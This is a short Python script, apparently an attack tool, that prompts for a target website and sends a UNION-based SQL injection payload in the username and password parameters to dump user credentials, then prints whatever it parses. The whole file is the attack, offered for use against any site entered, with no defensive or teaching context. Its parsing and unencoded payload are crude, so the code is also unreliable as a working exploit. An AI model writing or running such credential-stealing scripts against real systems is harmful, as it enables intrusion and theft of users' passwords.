import requests

def exploit_sql_injection(url):
    # SQL injection payload to retrieve user credentials
    payload = "' UNION SELECT username, password FROM users; --"
    
    # Construct the URL with the payload
    target_url = f"{url}?username={payload}&password={payload}"
    
    # Send a GET request with the crafted URL
    response = requests.get(target_url)
    
    # Check if the response indicates successful exploitation
    if response.status_code == 200:
        print("SQL Injection Successful!")
        print("Dumping User Credentials...")
        # Parse the response content to extract user credentials
        credentials = extract_credentials(response.text)
        print("User Credentials:")
        for credential in credentials:
            print(credential)
    else:
        print("SQL Injection Failed.")

def extract_credentials(response_text):
    # Parse the response text to extract user credentials
    credentials = []
    lines = response_text.split("\n")
    for line in lines:
        if "username" in line.lower() and "password" in line.lower():
            # Extract username and password from the line
            username = line.split("<username>")[-1].split("</username>")[0]
            password = line.split("<password>")[-1].split("</password>")[0]
            credentials.append((username, password))
    return credentials

if __name__ == "__main__":
    target_website = input("Enter the target website URL: ")
    exploit_sql_injection(target_website)
